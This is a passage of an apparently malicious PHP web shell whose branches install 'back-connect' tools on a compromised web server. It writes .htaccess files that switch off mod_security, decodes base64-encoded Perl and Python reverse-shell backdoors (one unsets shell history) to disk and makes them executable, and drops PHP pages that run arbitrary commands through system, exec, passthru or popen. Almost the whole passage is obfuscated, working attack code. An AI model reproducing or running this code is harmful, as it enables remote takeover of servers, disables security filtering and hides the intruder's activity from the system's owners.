13ZWJraXQtYm9yZGVyLXJhZGl1czogNHB4OyAgIC1tb3otYm9yZGVyLXJhZGl1czogNHB4OyAgIGJvcmRlci1yYWRpdXM6IDRweDsgICAtd2Via2l0LWJveC1zaGFkb3c6IHJnYmEoMCwxMTksMCkgMHB4IDBweCA0cHg7ICAgLW1vei1ib3gtc2hhZG93OiByZ2JhKDAsMTE5LDApIDBweCAwcHggNHB4O30gICAjY29tbWFuZHN7IG1hcmdpbi1sZWZ0OiAzNTBweDsgbWFyZ2luLXJpZ2h0OiAzNTBweDsgfSBvcHRpb257IGNvbG9yOiAjNzc3Nzc3OyB9PC9zdHlsZT4NCjw/cGhwDQplY2hvICc8YnI+PGNlbnRlcj48Yj48Zm9udCBjb2xvcj0iIzAwNzcwMCIgZmFjZT0iVGFob21hIiBzdHlsZT0iZm9udC1zaXplOiAxMXB0Ij5Db21tYW5kOiBydWJ5ICcuZ2V0Y3dkKCkuJy9yZXZiYWNray5yYiBwb3J0IGhvc3Q8L2ZvbnQ+PC9iPjxjZW50ZXI+PGJyPic7DQplY2hvICc8Zm9udCBmYWNlPSJUYWhvbWEiIGFsaWduPSJjZW50ZXIiIHNpemU9IjIiIGNvbG9yPSJncmVlbiI+IENvZGVkIEJ5IE1hdXJpdGFuaWEgQXR0YWNrZXIgPC9mb250Pic7DQplY2hvJzxwIGFsaWduPSJjZW50ZXIiPiA8aW1nIHNyYz0iaHR0cHM6Ly93d3ctdHJvcG8tY29tLnMzLmFtYXpvbmF3cy5jb20vd3AtY29udGVudC91cGxvYWRzLzIwMTAvMDgvcnVieS1sb2dvLTUxMjEucG5nIiAgd2lkdGg9IjE3NCIgaGVpZ2h0PSIyMDAiID48L3A+DQo8Zm9ybSBtZXRob2Q9Z2V0IGFjdGlvbj0iJy4kbWUuJyI+DQo8cD48dGV4dGFyZWEgY2xhc3M9ImFyZWEiIHJvd3M9IjEzIiBuYW1lPSJTMSIgY29scz0iNzAiID4nOw0KDQppZiAoc3RybGVuKCRfR0VUWydjb21tYW5kJ10pPjEgJiYgJF9HRVRbJ2V4ZWNtZXRob2QnXSE9InBvcGVuIil7DQplY2hvICRfR0VUWydleGVjbWV0aG9kJ10oJF9HRVRbJ2NvbW1hbmQnXSk7fQ0KaWYgKHN0cmxlbigkX1BPU1RbJ2NvbW1hbmQnXSk+MSAmJiAkX1BPU1RbJ2V4ZWNtZXRob2QnXSE9InBvcGVuIil7DQplY2hvICRfUE9TVFsnZXhlY21ldGhvZCddKCRfUE9TVFsnY29tbWFuZCddKTt9DQoNCmlmIChzdHJsZW4oJF9HRVRbJ2NvbW1hbmQnXSk+MSAmJiAkX0dFVFsnZXhlY21ldGhvZCddPT0icG9wZW4iKXsNCnBvcGVuKCRfR0VUWydjb21tYW5kJ10sInIiKTt9DQoNCmVjaG8nPC90ZXh0YXJlYT48L3A+DQo8cD48Y2VudGVyPjxmb250IGZhY2U9IkdlbmV2YSIgYWxpZ249ImNlbnRlciIgc2l6ZT0iMiIgY29sb3I9IiMwMDc3MDAiPklmIG5vdGhpbmcgd29yayBpdCBtZWFucyB0aGF0IHJ1YnkgaXMgbm90IGVuYWJsZWQgaW4gdGhpcyBzZXJ2ZXIgOig8L2ZvbnQ+PC9jZW50ZXI+PC9wPg0KPHAgYWxpZ249ImNlbnRlciI+DQo8Zm9udCBmYWNlPSJHZW5ldmEiIGFsaWduPSJjZW50ZXIiIHNpemU9IjMiIGNvbG9yPSIjMDA5OTAwIj5Db21tYW5kOiBydWJ5ICcuZ2V0Y3dkKCkuJy9yZXZiYWNray5yYiBwb3J0IGhvc3Q8L2ZvbnQ+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9InZ3IiBzaXplPSI1MCIgdmFsdWU9ImNtZCI+IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjb21tYW5kIiBzaXplPSI0MyI+IDxzZWxlY3QgbmFtZT1leGVjbWV0aG9kPg0KPG9wdGlvbiB2YWx1ZT0ic3lzdGVtIj5TeXN0ZW08L29wdGlvbj4gIDxvcHRpb24gdmFsdWU9ImV4ZWMiPkV4ZWM8L29wdGlvbj4gIDxvcHRpb24gdmFsdWU9InBhc3N0aHJ1Ij5QYXNzdGhydTwvb3B0aW9uPjxvcHRpb24gdmFsdWU9InBvcGVuIj5wb3Blbjwvb3B0aW9uPg0KPC9zZWxlY3Q+IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFeGVjdXRlIj4NCjwvcD48L2Zvcm0+JzsNCj8+';
$file = fopen("rubbbber.php" ,"w+");
$write = fwrite ($file ,base64_decode($merdeeeee));
fclose($file);

echo "<br><center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Ruby Back Connect Shell</span><center><br><iframe src=rubrub/rubbbber.php width=75% height=60% frameborder=0></iframe></div></center>"; 
}
} elseif($_GET['do'] == 'prlbckacnonect') { ?>
<?
{
	
mkdir('Backperlrev', 0755);
chdir('Backperlrev');
$kokwkwkwkwkw = ".htaccess";
$wkwkwkwkw_adi = "$kokwkwkwkwkw";
$wkwkwkwkw = fopen ($wkwkwkwkw_adi , 'w') or die ("wkwkwkwkw a&#231;&#305;lamad&#305;!");
$zilzil = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>";    
fwrite ( $wkwkwkwkw , $zilzil ) ;
fclose ($wkwkwkwkw);
$shellololol = 'dXNlIElPOjpTb2NrZXQ7DQokc3lzdGVtICA9ICcvYmluL2Jhc2gnOw0KJEFSR0M9QEFSR1Y7DQpwcmludCAiQW5vbkdob3N0IEJBQ0stQ09OTkVDVCBCQUNLRE9PUlxuXG4iOw0KaWYgKCRBUkdDIT0yKSB7DQogICBwcmludCAiVXNhZ2U6ICQwIFtIb3N0XSBbUG9ydF0gXG5cbiI7DQogICBkaWUgIkV4OiAkMCAxMjcuMC4wLjEgMjEyMSBcbiI7DQp9DQp1c2UgU29ja2V0Ow0KdXNlIEZpbGVIYW5kbGU7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpKSBvciBkaWUgcHJpbnQgIlstXSBVbmFibGUgdG8gUmVzb2x2ZSBIb3N0IDooXG4iOw0KY29ubmVjdChTT0NLRVQsIHNvY2thZGRyX2luKCRBUkdWWzFdLCBpbmV0X2F0b24oJEFSR1ZbMF0pKSkgb3IgZGllIHByaW50ICJbLV0gVW5hYmxlIHRvIENvbm5lY3QgSG9zdCA6KFxuIjsNCnByaW50ICJbKl0gUmVzb2x2aW5nIEhvc3ROYW1lXG4iOw0KcHJpbnQgIlsqXSBDb25uZWN0aW5nLi4uICRBUkdWWzBdIFxuIjsNCnByaW50ICJbKl0gU3Bhd25pbmcgU2hlbGwgXG4iOw0KcHJpbnQgIlsqXSBDb25uZWN0ZWQgdG8gcmVtb3RlIGhvc3QgXCEvIFxuIjsNClNPQ0tFVC0+YXV0b2ZsdXNoKCk7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCI+JlNPQ0tFVCIpOw0Kb3BlbihTVERFUlIsIj4mU09DS0VUIik7DQpwcmludCAiQW5vbkdob3N0IEJBQ0stQ09OTkVDVCBCQUNLRE9PUiAgXG5cbiI7DQpzeXN0ZW0oInVuc2V0IEhJU1RGSUxFOyB1bnNldCBTQVZFSElTVDtlY2hvIC0tPT1TeXN0ZW1pbmZvPT0tLTsgdW5hbWUgLWE7ZWNobzsNCmVjaG8gLS09PVVzZXJpbmZvPT0tLTsgaWQ7ZWNobztlY2hvIC0tPT1EaXJlY3Rvcnk9PS0tOyBwd2Q7ZWNobzsgZWNobyAtLT09U2hlbGw9PS0tICIpOw0Kc3lzdGVtKCRzeXN0ZW0pOw==';

$zerer = fopen("reverse.pl" ,"w+");
$write = fwrite ($zerer ,base64_decode($shellololol));
fclose($zerer);
chmod("reverse.pl",0755);

//extract php command shell
$zonop = 'PGh0bWw+PGhlYWQ+PHRpdGxlPkFub25HaG9zdCBQZXJsIENvbm5lY3QgU2hlbGwgUHJpdjg8L3RpdGxlPjxsaW5rIHJlbD0ic2hvcnRjdXQgaWNvbiIgaHJlZj0iaHR0cDovL3d3dzE0LjB6ejAuY29tLzIwMTQvMDYvMDQvMjEvMzk2NTU0Mzk0LnBuZyIgdHlwZT0iaW1hZ2UveC1pY29uIiAvPjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+DQpib2R5eyBiYWNrZ3JvdW5kLWNvbG9yOiAjMjIyMjIyICFpbXBvcnRhbnQ7IGNvbG9yOiAjMDA5OTAwOyB0ZXh0LXNoYWRvdzojMDAwIDBweCAycHggN3B4O30gICAgICBhe3RleHQtZGVjb3JhdGlvbjpub25lOyBmb250LWZhbWlseTogVGFob21hLCBHZW5ldmE7IGNvbG9yOiMwMDc3MDA7IHBhZGRpbmc6MnB4IDJweDt9ICAgICAgYTpob3Zlcntjb2xvcjojMDA5OTAwOyB0ZXh0LXNoYWRvdzojMDBmZjAwIDBweCAwcHggM3B4O30JICAuYXJlYSB7IGNvbG9yOiAjMDBiYjAwOyBmb250LXNpemU6IDlwdDsgdGV4dC1zaGFkb3c6IzAwMDAwMCAwcHggMnB4IDdweDsgYm9yZGVyOiBzb2xpZCAwcHggIzAwNzcwMDsgYmFja2dyb3VuZC1jb2xvcjp0cmFuc3BhcmVudDsgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwOTkwMDsgICAgcGFkZGluZzogM3B4OyAgIC13ZWJraXQtYm9yZGVyLXJhZGl1czogNHB4OyAgIC1tb3otYm9yZGVyLXJhZGl1czogNHB4OyAgIGJvcmRlci1yYWRpdXM6IDRweDsgICAtd2Via2l0LWJveC1zaGFkb3c6IHJnYigwLDExOSwwKSAwcHggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6IHJnYigwLDExOSwwKSAwcHggMHB4IDRweDsgfQkgIGlucHV0W3R5cGU9c3VibWl0XXsgcGFkZGluZzogM3B4OyBjb2xvcjogIzAwNzcwOyAgZm9udC13ZWlnaHQ6IGJvbGQ7IHRleHQtYWxpZ246IGNlbnRlcjsgIHRleHQtc2hhZG93OiAwIDFweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMyk7ICBiYWNrZ3JvdW5kOiAjYWVhZWFlOyAgYmFja2dyb3VuZC1jbGlwOiBwYWRkaW5nLWJveDsgIGJvcmRlcjogMXB4IHNvbGlkICMyODQ0NzM7ICBib3JkZXItYm90dG9tLWNvbG9yOiAjMjIzYjY2OyAgYm9yZGVyLXJhZGl1czogNHB4OyAgY3Vyc29yOiBwb2ludGVyOyAgYmFja2dyb3VuZC1pbWFnZTotd2Via2l0LWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOyAgYmFja2dyb3VuZC1pbWFnZTogLW1vei1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsgIGJhY2tncm91bmQtaW1hZ2U6IC1vLWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOyAgYmFja2dyb3VuZC1pbWFnZTogbGluZWFyLWdyYWRpZW50KHRvIGJvdHRvbSwgI2VhZWFlYSwgI2QwZDBkMCk7ICAtd2Via2l0LWJveC1zaGFkb3c6IGluc2V0IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC41KSwgaW5zZXQgMCAwIDdweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNCksIDAgMXB4IDFweCByZ2JhKDAsIDAsIDAsIDAuMTUpOyAgYm94LXNoYWRvdzogaW5zZXQgMCAxcHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjUpLCBpbnNldCAwIDAgN3B4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC40KSwgMCAxcHggMXB4IHJnYmEoMCwgMCwgMCwgMC4xNSk7IH0gaW5wdXRbdHlwZT10ZXh0XXsgcGFkZGluZzogM3B4OyBjb2xvcjogIzAwOTkwMDsgdGV4dC1zaGFkb3c6ICM3Nzc3NzcgMHB4IDBweCAzcHg7IGJvcmRlcjogMXB4IHNvbGlkICMwMDc3MDA7IGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDA3NzAwOyAgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiKDg1LDg1LDg1KSAwcHggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6IHJnYig4NSw4NSw4NSkgMHB4IDBweCA0cHg7fSBpbnB1dFt0eXBlPXN1Ym1pdF06aG92ZXIsIGlucHV0W3R5cGU9dGV4dF06aG92ZXJ7IGNvbG9yOiAjZmZmZmZmOyB0ZXh0LXNoYWRvdzogIzAwNjYwMCAwcHggMHB4IDRweDsgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwZGQwMDsgYm9yZGVyOiAxcHggc29saWQgIzAwZGQwMDsgICAgcGFkZGluZzogM3B4OyAgIC13ZWJraXQtYm9yZGVyLXJhZGl1czogNHB4OyAgIC1tb3otYm9yZGVyLXJhZGl1czogNHB4OyAgIGJvcmRlci1yYWRpdXM6IDRweDsgICAtd2Via2l0LWJveC1zaGFkb3c6IHJnYmEoMCwxMTksMCkgMHB4IDBweCA0cHg7ICAgLW1vei1ib3gtc2hhZG93OiByZ2JhKDAsMTE5LDApIDBweCAwcHggNHB4O30gc2VsZWN0eyBwYWRkaW5nOiAzcHg7IHdpZHRoOiAxNjJweDsgY29sb3I6ICMwMGFhMDA7IHRleHQtc2hhZG93OiMwMDAgMHB4IDJweCA3cHg7IGJvcmRlcjogMXB4IHNvbGlkICMwMDc3MDA7IGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyB0ZXh0LWRlY29yYXRpb246IG5vbmU7IGJveC1zaGFkb3c6IDBweCAwcHggNHB4ICMwMGFhMDA7ICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiKDg1LCA4NSwgODUpIDBweCAwcHggNHB4OyAgIC1tb3otYm94LXNoYWRvdzogcmdiKDg1LCA4NSwgODUpIDBweCAwcHggNHB4O30gc2VsZWN0OmhvdmVyeyBib3JkZXI6IDFweCBzb2xpZCAjMDBkZDAwOyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDBkZDAwOyAgIHBhZGRpbmc6IDNweDsgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsgICAtbW96LWJvcmRlci1yYWRpdXM6IDRweDsgICBib3JkZXItcmFkaXVzOiA0cHg7ICAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2JhKDAsMTE5LDApIDBweCAwcHggNHB4OyAgIC1tb3otYm94LXNoYWRvdzogcmdiYSgwLDExOSwwKSAwcHggMHB4IDRweDt9ICAgI2NvbW1hbmRzeyBtYXJnaW4tbGVmdDogMzUwcHg7IG1hcmdpbi1yaWdodDogMzUwcHg7IH0gb3B0aW9ueyBjb2xvcjogIzc3Nzc3NzsgfTwvc3R5bGU+DQo8P3BocA0KZWNobyAnPGNlbnRlcj48Zm9udCBjb2xvcj0iIzAwNzcwMCIgZmFjZT0iVGFob21hIiBzdHlsZT0iZm9udC1zaXplOiAxMXB0Ij5Vc2FnZTogcmV2ZXJzZS5wbCBbSG9zdF0gW1BvcnRdPC9mb250Pjxicj4nOw0KZWNobyc8cCBhbGlnbj0iY2VudGVyIj4gDQo8aW1nIGJvcmRlcj0iMCIgc3JjPSJodHRwOi8vd3d3OS4wenowLmNvbS8yMDE0LzA4LzIwLzE5LzQ3MDA3MTkzOS5wbmciPjwvcD48Zm9udCBmYWNlPSJHZW5ldmEiIGFsaWduPSJjZW50ZXIiIHNpemU9IjIiIGNvbG9yPSIjMDA3NzAwIj4gQ29kZWQgQnkgTWF1cml0YW5pYSBBdHRhY2tlciA8L2ZvbnQ+PGJyPg0KPGZvcm0gbWV0aG9kPWdldCBhY3Rpb249IicuJG1lLiciPg0KPHRleHRhcmVhIGNsYXNzPSJhcmVhIiByb3dzPSIxMyIgbmFtZT0iUzEiIGNvbHM9IjcwIiA+JzsNCg0KaWYgKHN0cmxlbigkX0dFVFsnY29tbWFuZCddKT4xICYmICRfR0VUWydleGVjbWV0aG9kJ10hPSJwb3BlbiIpew0KZWNobyAkX0dFVFsnZXhlY21ldGhvZCddKCRfR0VUWydjb21tYW5kJ10pO30NCmlmIChzdHJsZW4oJF9QT1NUWydjb21tYW5kJ10pPjEgJiYgJF9QT1NUWydleGVjbWV0aG9kJ10hPSJwb3BlbiIpew0KZWNobyAkX1BPU1RbJ2V4ZWNtZXRob2QnXSgkX1BPU1RbJ2NvbW1hbmQnXSk7fQ0KDQppZiAoc3RybGVuKCRfR0VUWydjb21tYW5kJ10pPjEgJiYgJF9HRVRbJ2V4ZWNtZXRob2QnXT09InBvcGVuIil7DQpwb3BlbigkX0dFVFsnY29tbWFuZCddLCJyIik7fQ0KDQplY2hvJzwvdGV4dGFyZWE+DQo8cD48Y2VudGVyPklmIG5vdGhpbmcgd29yayBpdCBtZWFucyB0aGF0IHBlcmwgaXMgbm90IGVuYWJsZWQgaW4gdGhpcyBzZXJ2ZXIgOig8L2NlbnRlcj48L3A+DQo8cCBhbGlnbj0iY2VudGVyIj48c3Ryb25nPkNvbW1hbmQ6IHBlcmwgcmV2ZXJzZS5wbCB5b3VySVAgUG9ydDwvc3Ryb25nPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPSJ2dyIgc2l6ZT0iNTAiIHZhbHVlPSJjbWQiPiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iY29tbWFuZCIgc2l6ZT0iNDMiPiA8c2VsZWN0IG5hbWU9ZXhlY21ldGhvZD4NCjxvcHRpb24gdmFsdWU9InN5c3RlbSI+U3lzdGVtPC9vcHRpb24+ICA8b3B0aW9uIHZhbHVlPSJleGVjIj5FeGVjPC9vcHRpb24+ICA8b3B0aW9uIHZhbHVlPSJwYXNzdGhydSI+UGFzc3RocnU8L29wdGlvbj48b3B0aW9uIHZhbHVlPSJwb3BlbiI+cG9wZW48L29wdGlvbj4NCjwvc2VsZWN0PiA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRXhlY3V0ZSI+DQo8L3A+PC9mb3JtPic7DQo/Pg==';
$file = fopen("kit.php" ,"w+");
$write = fwrite ($file ,base64_decode($zonop));
fclose($file);

echo "<br><center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Perl Connect Shell Priv8</span></b><center><br><iframe src=Backperlrev/kit.php width=75% height=60% frameborder=0></iframe></div></center>";
}

} elseif($_GET['do'] == 'pythnonbakcncete') { ?>
<?
{

mkdir('pyrevrshell', 0755);
chdir('pyrevrshell');
$seropil = ".htaccess";
$angelinalll = "$seropil";
$shitttyz = fopen ($angelinalll , 'w') or die ("shitttyz a&#231;&#305;lamad&#305;!");
$dffvfdgfg = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>";    
fwrite ( $shitttyz , $dffvfdgfg ) ;
fclose ($shitttyz);
//extract python reverse script
$vkffhd = 'IyEvdXNyL2Jpbi9weXRob24NCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IHNvY2tldA0KaW1wb3J0IHB0eQ0KIA0Kc2hlbGwgPSAiL2Jpbi9zaCINCiANCmRlZiB1c2FnZShwcm9ncmFtbmFtZSk6DQpwcmludCAieXRob24gY29ubmVjdC1iYWNrIGRvb3IiDQpwcmludCAiVXNhZ2U6ICVzIDxjb25uX2JhY2tfaXA+IDxwb3J0PiIgJSBwcm9ncmFtbmFtZQ0KIA0KZGVmIG1haW4oKToNCmlmIGxlbihzeXMuYXJndikgIT0zOg0KdXNhZ2Uoc3lzLmFyZ3ZbMF0pDQpzeXMuZXhpdCgxKQ0KIA0KcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQ0KIA0KdHJ5Og0Kcy5jb25uZWN0KChzb2NrZXQuZ2V0aG9zdGJ5bmFtZShzeXMuYXJndlsxXSksaW50KHN5cy5hcmd2WzJdKSkpDQpwcmludCAiWytdQ29ubmVjdCBPSy4iDQpleGNlcHQ6DQpwcmludCAiWy1dQ2FuJ3QgY29ubmVjdCINCnN5cy5leGl0KDIpDQogDQpvcy5kdXAyKHMuZmlsZW5vKCksMCkNCm9zLmR1cDIocy5maWxlbm8oKSwxKQ0Kb3MuZHVwMihzLmZpbGVubygpLDIpDQpnbG9iYWwgc2hlbGwNCm9zLnVuc2V0ZW52KCJISVNURklMRSIpDQpvcy51bnNldGVudigiSElTVEZJTEVTSVpFIikNCnB0eS5zcGF3bihzaGVsbCkNCnMuY2xvc2UoKQ0KIA0KaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoNCm1haW4oKQ==';

$jkol = fopen("reversesh.py" ,"w+");
$write = fwrite ($jkol ,base64_decode($vkffhd));
fclose($jkol);
chmod("reversesh.py",0755);

//extract php command shell
$merdeeeee = 'PGh0bWw+PGhlYWQ+PHRpdGxlPkFub25HaG9zdCBQeXRob24gQ29ubmVjdCBTaGVsbCBQcml2ODwvdGl0bGU+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3MTQuMHp6MC5jb20vMjAxNC8wNi8wNC8yMS8zOTY1NTQzOTQucG5nIiB0eXBlPSJpbWFnZS94LWljb24iIC8+PHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmJvZHl7IGJhY2tncm91bmQtY29sb3I6ICMyMjIyMjIgIWltcG9ydGFudDsgY29sb3I6ICMwMDk5MDA7IHRleHQtc2hhZG93OiMwMDAgMHB4IDJweCA3cHg7fSAgICAgIGF7dGV4dC1kZWNvcmF0aW9uOm5vbmU7IGZvbnQtZmFtaWx5OiBUYWhvbWEsIEdlbmV2YTsgY29sb3I6IzAwNzcwMDsgcGFkZGluZzoycHggMnB4O30gICAgICBhOmhvdmVye2NvbG9yOiMwMDk5MDA7IHRleHQtc2hhZG93OiMwMGZmMDAgMHB4IDBweCAzcHg7fQkgIC5hcmVhIHsgY29sb3I6ICMwMGJiMDA7IGZvbnQtc2l6ZTogOXB0OyB0ZXh0LXNoYWRvdzojMDAwMDAwIDBweCAycHggN3B4OyBib3JkZXI6IHNvbGlkIDBweCAjMDA3NzAwOyBiYWNrZ3JvdW5kLWNvbG9yOnRyYW5zcGFyZW50OyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDA5OTAwOyAgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiKDAsMTE5LDApIDBweCAwcHggNHB4OyAgIC1tb3otYm94LXNoYWRvdzogcmdiKDAsMTE5LDApIDBweCAwcHggNHB4OyB9CSAgaW5wdXRbdHlwZT1zdWJtaXRdeyBwYWRkaW5nOiAzcHg7IGNvbG9yOiAjMDA3NzA7ICBmb250LXdlaWdodDogYm9sZDsgdGV4dC1hbGlnbjogY2VudGVyOyAgdGV4dC1zaGFkb3c6IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4zKTsgIGJhY2tncm91bmQ6ICNhZWFlYWU7ICBiYWNrZ3JvdW5kLWNsaXA6IHBhZGRpbmctYm94OyAgYm9yZGVyOiAxcHggc29saWQgIzI4NDQ3MzsgIGJvcmRlci1ib3R0b20tY29sb3I6ICMyMjNiNjY7ICBib3JkZXItcmFkaXVzOiA0cHg7ICBjdXJzb3I6IHBvaW50ZXI7ICBiYWNrZ3JvdW5kLWltYWdlOi13ZWJraXQtbGluZWFyLWdyYWRpZW50KHRvcCwgI2VhZWFlYSwgI2QwZDBkMCk7ICBiYWNrZ3JvdW5kLWltYWdlOiAtbW96LWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOyAgYmFja2dyb3VuZC1pbWFnZTogLW8tbGluZWFyLWdyYWRpZW50KHRvcCwgI2VhZWFlYSwgI2QwZDBkMCk7ICBiYWNrZ3JvdW5kLWltYWdlOiBsaW5lYXItZ3JhZGllbnQodG8gYm90dG9tLCAjZWFlYWVhLCAjZDBkMGQwKTsgIC13ZWJraXQtYm94LXNoYWRvdzogaW5zZXQgMCAxcHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjUpLCBpbnNldCAwIDAgN3B4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC40KSwgMCAxcHggMXB4IHJnYmEoMCwgMCwgMCwgMC4xNSk7ICBib3gtc2hhZG93OiBpbnNldCAwIDFweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNSksIGluc2V0IDAgMCA3cHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjQpLCAwIDFweCAxcHggcmdiYSgwLCAwLCAwLCAwLjE1KTsgfSBpbnB1dFt0eXBlPXRleHRdeyBwYWRkaW5nOiAzcHg7IGNvbG9yOiAjMDA5OTAwOyB0ZXh0LXNoYWRvdzogIzc3Nzc3NyAwcHggMHB4IDNweDsgYm9yZGVyOiAxcHggc29saWQgIzAwNzcwMDsgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IGJveC1zaGFkb3c6IDBweCAwcHggNHB4ICMwMDc3MDA7ICAgIHBhZGRpbmc6IDNweDsgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsgICAtbW96LWJvcmRlci1yYWRpdXM6IDRweDsgICBib3JkZXItcmFkaXVzOiA0cHg7ICAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2IoODUsODUsODUpIDBweCAwcHggNHB4OyAgIC1tb3otYm94LXNoYWRvdzogcmdiKDg1LDg1LDg1KSAwcHggMHB4IDRweDt9IGlucHV0W3R5cGU9c3VibWl0XTpob3ZlciwgaW5wdXRbdHlwZT10ZXh0XTpob3ZlcnsgY29sb3I6ICNmZmZmZmY7IHRleHQtc2hhZG93OiAjMDA2NjAwIDBweCAwcHggNHB4OyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDBkZDAwOyBib3JkZXI6IDFweCBzb2xpZCAjMDBkZDAwOyAgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiYSgwLDExOSwwKSAwcHggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6IHJnYmEoMCwxMTksMCkgMHB4IDBweCA0cHg7fSBzZWxlY3R7IHBhZGRpbmc6IDNweDsgd2lkdGg6IDE2MnB4OyBjb2xvcjogIzAwYWEwMDsgdGV4dC1zaGFkb3c6IzAwMCAwcHggMnB4IDdweDsgYm9yZGVyOiAxcHggc29saWQgIzAwNzcwMDsgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwYWEwMDsgIHBhZGRpbmc6IDNweDsgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsgICAtbW96LWJvcmRlci1yYWRpdXM6IDRweDsgICBib3JkZXItcmFkaXVzOiA0cHg7ICAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2IoODUsIDg1LCA4NSkgMHB4IDBweCA0cHg7ICAgLW1vei1ib3gtc2hhZG93OiByZ2IoODUsIDg1LCA4NSkgMHB4IDBweCA0cHg7fSBzZWxlY3Q6aG92ZXJ7IGJvcmRlcjogMXB4IHNvbGlkICMwMGRkMDA7IGJveC1zaGFkb3c6IDBweCAwcHggNHB4ICMwMGRkMDA7ICAgcGFkZGluZzogM3B4OyAgIC13ZWJraXQtYm9yZGVyLXJhZGl1czogNHB4OyAgIC1tb3otYm9yZGVyLXJhZGl1czogNHB4OyAgIGJvcmRlci1yYWRpdXM6IDRweDsgICAtd2Via2l0LWJveC1zaGFkb3c6IHJnYmEoMCwxMTksMCkgMHB4IDBweCA0cHg7ICAgLW1vei1ib3gtc2hhZG93OiByZ2JhKDAsMTE5LDApIDBweCAwcHggNHB4O30gICAjY29tbWFuZHN7IG1hcmdpbi1sZWZ0OiAzNTBweDsgbWFyZ2luLXJpZ2h0OiAzNTBweDsgfSBvcHRpb257IGNvbG9yOiAjNzc3Nzc3OyB9PC9zdHlsZT4NCjw/cGhwDQplY2hvICc8Y2VudGVyPjxmb250IGNvbG9yPSIjMDA3NzAwIiBmYWNlPSJUYWhvbWEiIHN0eWxlPSJmb250LXNpemU6IDEycHQiPlVzYWdlOiByZXZlcnNlc2gucHkgW0hvc3RdIFtQb3J0XTwvZm9udD4nOw0KZWNobyc8cCBhbGlnbj0iY2VudGVyIj4gDQo8aW1nIGJvcmRlcj0iMCIgc3JjPSJodHRwOi8vd3d3MTAuMHp6MC5jb20vMjAxNC8wOC8yMC8yMC8yMjU4MTYzNTUucG5nIj48L3A+PGZvbnQgZmF